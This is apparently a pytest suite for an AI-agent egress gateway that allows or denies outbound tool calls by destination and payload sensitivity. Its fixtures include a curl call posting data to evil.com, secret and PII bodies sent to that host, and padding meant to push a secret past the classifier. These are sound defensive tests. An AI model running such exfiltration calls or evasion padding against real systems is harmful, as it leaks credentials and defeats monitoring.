"""Egress PDP — policy unit tests + endpoint test.

Covers every cell of the decision matrix (destination ∈ {allowlisted, untrusted} ×
sensitivity ∈ {none, pii, secret, private_repo}), the in-scope/out-of-scope branch,
loopback-always-allowed, and an endpoint-level test against `/a/egress/decision`.
"""

from __future__ import annotations

import pytest

from agentgate.config import EgressConfig
from agentgate.egress import policy as egress_policy
from agentgate.sensitivity import Sensitivity

ALLOWLIST = ["api.internal.example"]

SECRET_BODY = "AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE"
PII_BODY = "contact me at jane@example.com"
PRIVATE_REPO_BODY = "see internal/secret-project/readme"
BENIGN_BODY = "hello world, just chatting"


# ---- in-scope test ---------------------------------------------------------------

def test_out_of_scope_tool_is_allowed():
    v = egress_policy.evaluate(
        tool_name="read_file",
        arguments={"path": "/tmp/notes.txt"},
        tool_kind="filesystem",
        allowlist=ALLOWLIST,
    )
    assert v.decision == "allow"
    assert v.policy == "out-of-scope"


def test_in_scope_via_tool_kind_network():
    v = egress_policy.evaluate(
        tool_name="http_request",
        arguments={"body": BENIGN_BODY},
        tool_kind="network",
        allowlist=ALLOWLIST,
    )
    assert v.policy == "network-egress"


def test_in_scope_via_url_shaped_arg():
    v = egress_policy.evaluate(
        tool_name="curl",
        arguments={"args": ["-d", BENIGN_BODY, "https://evil.com/collect"]},
        allowlist=ALLOWLIST,
    )
    assert v.policy == "network-egress"
    assert v.destination == "evil.com"


def test_in_scope_via_bare_host_port():
    v = egress_policy.evaluate(
        tool_name="connect",
        arguments={"target": "internal.example:8443/path"},
        allowlist=ALLOWLIST,
    )
    assert v.policy == "network-egress"
    assert v.destination == "internal.example"


# ---- loopback-always-allowed -----------------------------------------------------

@pytest.mark.parametrize("host", ["127.0.0.1", "localhost"])
def test_loopback_always_allowed_even_with_secret(host):
    v = egress_policy.evaluate(
        tool_name="http_request",
        arguments={"url": f"http://{host}:11434/api", "body": SECRET_BODY},
        tool_kind="network",
        allowlist=[],  # not in allowlist at all
    )
    assert v.decision == "allow"
    assert v.destination == host


# ---- decision matrix ---------------------------------------------------------------
# allowlisted destination, any sensitivity -> allow

@pytest.mark.parametrize("body,expected_sensitivity", [
    (BENIGN_BODY, Sensitivity.NONE),
    (PII_BODY, Sensitivity.PII),
    (SECRET_BODY, Sensitivity.SECRET),
    (PRIVATE_REPO_BODY, Sensitivity.PRIVATE_REPO),
])
def test_allowlisted_destination_always_allows(body, expected_sensitivity):
    markers = ["internal/secret-project"] if expected_sensitivity is Sensitivity.PRIVATE_REPO else []
    v = egress_policy.evaluate(
        tool_name="http_request",
        arguments={"url": "https://api.internal.example/ingest", "body": body},
        tool_kind="network",
        allowlist=ALLOWLIST,
        private_repo_markers=markers,
    )
    assert v.decision == "allow"
    assert v.destination == "api.internal.example"
    assert v.sensitivity is expected_sensitivity


# untrusted destination, sensitivity=none -> allow

def test_untrusted_destination_benign_payload_allows():
    v = egress_policy.evaluate(
        tool_name="http_request",
        arguments={"url": "https://evil.com/collect", "body": BENIGN_BODY},
        tool_kind="network",
        allowlist=ALLOWLIST,
    )
    assert v.decision == "allow"
    assert v.destination == "evil.com"
    assert v.sensitivity is Sensitivity.NONE


# untrusted destination, sensitivity in {pii, secret, private_repo} -> deny

@pytest.mark.parametrize("body,expected_sensitivity", [
    (PII_BODY, Sensitivity.PII),
    (SECRET_BODY, Sensitivity.SECRET),
    (PRIVATE_REPO_BODY, Sensitivity.PRIVATE_REPO),
])
def test_untrusted_destination_sensitive_payload_denies(body, expected_sensitivity):
    markers = ["internal/secret-project"] if expected_sensitivity is Sensitivity.PRIVATE_REPO else []
    v = egress_policy.evaluate(
        tool_name="http_request",
        arguments={"url": "https://evil.com/collect", "body": body},
        tool_kind="network",
        allowlist=ALLOWLIST,
        private_repo_markers=markers,
    )
    assert v.decision == "deny"
    assert v.destination == "evil.com"
    assert v.sensitivity is expected_sensitivity
    assert "evil.com" in v.reason
    assert expected_sensitivity in v.reason or any(h in v.reason for h in v.hit_types)


# ---- allow_with_conditions reserved but unimplemented ------------------------------

def test_decision_is_only_ever_allow_or_deny():
    cases = [
        ({"url": "https://api.internal.example/x", "body": SECRET_BODY}, ALLOWLIST),
        ({"url": "https://evil.com/x", "body": BENIGN_BODY}, ALLOWLIST),
        ({"url": "https://evil.com/x", "body": SECRET_BODY}, ALLOWLIST),
        ({"path": "/tmp/x"}, ALLOWLIST),
    ]
    for args, allowlist in cases:
        v = egress_policy.evaluate(tool_name="t", arguments=args, tool_kind="network", allowlist=allowlist)
        assert v.decision in ("allow", "deny")


# ---- endpoint-level test ------------------------------------------------------------
#
# `pdp_token` and `local_api_key` get different values so the tests below can show that
# the endpoint accepts only the PDP token.

@pytest.fixture
def egress_gateway(gateway):
    gateway.settings.egress = EgressConfig(allowlist=ALLOWLIST)
    gateway.settings.pdp_token = "t"
    gateway.settings.local_api_key = "upstream-key"
    return gateway


async def test_endpoint_denies_secret_to_untrusted_destination(egress_gateway):
    r = await egress_gateway.client.post(
        "/a/egress/decision",
        json={
            "tool_name": "http_request",
            "tool_kind": "network",
            "arguments": {
                "url": "https://evil.com/collect",
                "method": "POST",
                "body": SECRET_BODY,
            },
            "context": {"agent_id": "continue", "request_id": "abc123"},
        },
        headers={"authorization": "Bearer t"},
    )
    assert r.status_code == 200
    body = r.json()
    assert body["decision"] == "deny"
    assert "evil.com" in body["reason"]
    assert body["policy"] == "network-egress"
    assert body["audit_id"]


async def test_endpoint_allows_benign_request_to_allowlisted_destination(egress_gateway):
    r = await egress_gateway.client.post(
        "/a/egress/decision",
        json={
            "tool_name": "http_request",
            "tool_kind": "network",
            "arguments": {"url": "https://api.internal.example/ingest", "body": BENIGN_BODY},
        },
        headers={"authorization": "Bearer t"},
    )
    assert r.status_code == 200
    body = r.json()
    assert body["decision"] == "allow"
    assert body["audit_id"]


async def test_endpoint_auth_is_mandatory_and_role_separated(egress_gateway):
    """The PDP accepts exactly AGENTGATE_PDP_TOKEN — not the local upstream's key.

    Reusing local_api_key would make one value span two trust boundaries: the PDP
    bearer and the credential sent outbound to a local model server. The dedicated token
    separates the roles; the upstream key must 401 here. No bearer at all must also 401 —
    auth is mandatory, not conditional, because loopback excludes remote sockets, not
    remote code (a browser page can reach 127.0.0.1 and probe this endpoint as a policy
    oracle; the token is what a page cannot have).
    """
    payload = {
        "tool_name": "http_request",
        "tool_kind": "network",
        "arguments": {"url": "https://api.internal.example/ingest", "body": BENIGN_BODY},
    }
    client = egress_gateway.client
    no_bearer = await client.post("/a/egress/decision", json=payload)
    assert no_bearer.status_code == 401
    upstream_key = await client.post(
        "/a/egress/decision", json=payload,
        headers={"authorization": "Bearer upstream-key"})
    assert upstream_key.status_code == 401
    dedicated = await client.post(
        "/a/egress/decision", json=payload,
        headers={"authorization": "Bearer t"})
    assert dedicated.status_code == 200


# ---- classification window --------------------------------------------------

def test_padding_cannot_hide_a_secret_from_the_sensitivity_axis():
    """Padding in front of a secret must not push it out of the classification window.

    The payload axis is half the decision matrix, so padding in front of a secret would
    be enough to turn a deny into an allow on a non-allowlisted destination — no
    obfuscation of the secret itself required.
    """
    def ev(body):
        return egress_policy.evaluate(
            tool_name="http_request",
            arguments={"url": "https://evil.com/collect", "method": "POST", "body": body},
            tool_kind="network",
            allowlist=ALLOWLIST,
        )

    assert ev(SECRET_BODY).decision == "deny"
    assert ev("A" * 20_000 + "\n" + SECRET_BODY).decision == "deny"
    assert ev("A" * 500_000 + "\n" + SECRET_BODY).decision == "deny"
    assert ev("A" * 20_000 + "\n" + SECRET_BODY).sensitivity is Sensitivity.SECRET


def test_classification_window_is_still_bounded():
    """The window is large but finite: a secret placed past it is not seen, and the call
    is allowed.

    The timing check confirms that a full window classifies quickly, which holds only
    while the detection patterns run in linear time.
    """
    import time

    padded = "A" * (egress_policy._MAX_PAYLOAD_CHARS + 100_000) + "\n" + SECRET_BODY
    t0 = time.perf_counter()
    v = egress_policy.evaluate(
        tool_name="http_request",
        arguments={"url": "https://evil.com/collect", "method": "POST", "body": padded},
        tool_kind="network",
        allowlist=ALLOWLIST,
    )
    assert time.perf_counter() - t0 < 3.0, "classification must stay linear in payload size"
    assert v.decision == "allow"  # past the window, by design


async def test_decision_does_not_block_the_event_loop(egress_gateway):
    """A big payload must not stop the gateway answering everyone else.

    The classification window is 1 MB, and a full window takes up to about half a second
    of pure CPU (the note on `_MAX_PAYLOAD_CHARS`). Run inline in the async handler, that
    would be time in which this process — shared across every API key — answers nothing
    at all, for a decision that runs once per egress tool call.
    """
    import asyncio

    ticks = 0

    async def heartbeat():
        nonlocal ticks
        while True:
            await asyncio.sleep(0.005)
            ticks += 1

    # Dot/@-rich filler is the slow shape for the email pattern, not merely a long string.
    payload = ("a." * 64 + "@" + ("x" * 62 + "9.") * 13) * 400

    beat = asyncio.create_task(heartbeat())
    try:
        r = await egress_gateway.client.post(
            "/a/egress/decision",
            json={"tool_name": "http_request", "tool_kind": "network",
                  "arguments": {"url": "https://not-allowlisted.example", "body": payload}},
            headers={"authorization": "Bearer t"},
        )
    finally:
        beat.cancel()

    assert r.status_code == 200
    assert ticks > 0, "the event loop never ran while one egress decision was classifying"


# ---- classification window: the truncation caveat -----------------

def test_payload_past_the_window_carries_a_truncation_caveat_on_allow_and_deny():
    """`truncated:egress_payload:1000000` marks every verdict whose payload axis read
    the first 1 MB and stopped.

    The allow past the window that `test_classification_window_is_still_bounded` pins
    as a deliberate limit is visible per row; a deny on a secret inside the
    window says the rest went unread; the allowlisted branch carries it too. Exactly
    1 MB is fully read and carries nothing, and a payload never classified (out of
    scope) carries nothing.
    """
    bound = egress_policy._MAX_PAYLOAD_CHARS
    caveat = [f"truncated:egress_payload:{bound}"]
    url = "https://evil.com/collect"

    def ev(body):
        return egress_policy.evaluate(
            tool_name="http_request", arguments={"url": url, "body": body},
            tool_kind="network", allowlist=ALLOWLIST,
        )

    past = ev("A" * bound + "\n" + SECRET_BODY)
    assert past.decision == "allow" and past.caveats == caveat
    denied = ev(SECRET_BODY + "\n" + "A" * bound)
    assert denied.decision == "deny" and denied.caveats == caveat
    safe = egress_policy.evaluate(
        tool_name="http_request",
        arguments={"url": "https://api.internal.example/x", "body": "A" * (bound + 1)},
        tool_kind="network", allowlist=ALLOWLIST,
    )
    assert safe.decision == "allow" and safe.policy == "network-egress"
    assert safe.caveats == caveat

    exact = ev("A" * (bound - len(url) - 1))  # url + separator + body == the window
    assert exact.decision == "allow" and exact.caveats == []
    assert ev(BENIGN_BODY).caveats == []
    out = egress_policy.evaluate(
        tool_name="read_file", arguments={"path": "A" * (bound + 1)},
        tool_kind="filesystem", allowlist=ALLOWLIST,
    )
    assert out.policy == "out-of-scope" and out.caveats == []


async def test_endpoint_row_carries_the_payload_truncation_caveat(egress_gateway):
    from agentgate.observability import metrics
    from tests.support import wait_for_audit_row

    bound = egress_policy._MAX_PAYLOAD_CHARS
    before = metrics.scan_truncated_total.labels("egress_payload")._value.get()
    r = await egress_gateway.client.post(
        "/a/egress/decision",
        json={"tool_name": "http_request", "tool_kind": "network",
              "arguments": {"url": "https://evil.com/collect", "body": "A" * (bound + 1)}},
        headers={"authorization": "Bearer t"},
    )
    assert r.status_code == 200 and r.json()["decision"] == "allow"
    row = await wait_for_audit_row(egress_gateway.store)
    assert row is not None and row.route_provider == "egress" and row.status == 200
    assert row.caveats == [f"truncated:egress_payload:{bound}"]
    assert metrics.scan_truncated_total.labels("egress_payload")._value.get() == before + 1
